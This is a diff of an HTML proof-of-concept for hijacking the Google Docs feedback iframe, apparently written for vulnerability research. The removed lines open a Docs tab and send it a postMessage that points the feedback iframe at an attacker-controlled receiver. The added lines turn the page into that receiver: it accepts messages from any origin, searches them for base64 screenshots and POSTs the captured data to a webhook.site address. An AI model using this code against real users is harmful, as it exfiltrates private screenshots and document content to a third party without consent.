@@ -1,44 +1,41 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Google Docs Feedback Hijack PoC</title>
-  </head>
   <body>
-    <h2>🧪 Google Docs Feedback Hijack Proof-of-Concept</h2>
-    <p>
-      This page simulates an attacker opening Google Docs in a new window and later hijacking the feedback iframe.
-    </p>
-    <p><strong>Instructions:</strong></p>
-    <ol>
-      <li>Click the button below to open a new Google Docs document in a separate tab.</li>
-      <li>In that tab, click <em>Help → Send Feedback</em>.</li>
-      <li>This tab will wait 10 seconds, then attempt to redirect the feedback iframe to the attacker's domain.</li>
-    </ol>
-
-    <button onclick="openDocs()">Open Google Docs</button>
-
+    <h1>Receiver Loaded</h1>
     <script>
-      const targetURL = "https://musgaas.github.io/receiver-test/receiver.html";
+      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace
 
-      function openDocs() {
-        const win = window.open("https://docs.google.com/document/u/0/create", "docswin");
-
-        // After delay, attempt to redirect the feedback iframe in that tab
-        setTimeout(() => {
-          try {
-            win.postMessage(
-              {
-                type: "SWAP_FEEDBACK_IFRAME",
-                url: targetURL
-              },
-              "*"
-            );
-            console.log("📤 postMessage sent to target window.");
-          } catch (err) {
-            console.error("❌ Failed to send postMessage:", err);
-          }
-        }, 10000); // Wait 10s for user to trigger "Send Feedback"
+      function deepFindScreenshot(obj) {
+        const str = JSON.stringify(obj);
+        const match = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
+        return match ? match[0] : null;
       }
+
+      window.addEventListener("message", (e) => {
+        try {
+          const payload = e.data;
+          const origin = e.origin;
+          const keys = Object.keys(payload || {});
+          const screenshot = deepFindScreenshot(payload);
+
+          fetch(webhookURL, {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify({
+              timestamp: new Date().toISOString(),
+              origin,
+              keys,
+              containsScreenshot: !!screenshot,
+              truncated: JSON.stringify(payload).slice(0, 1000)
+            })
+          });
+
+          // Removed alert() entirely
+          console.log("📥 Message received. Keys:", keys);
+        } catch (err) {
+          console.error("Error processing message:", err);
+        }
+      }, false);
     </script>
   </body>
 </html>
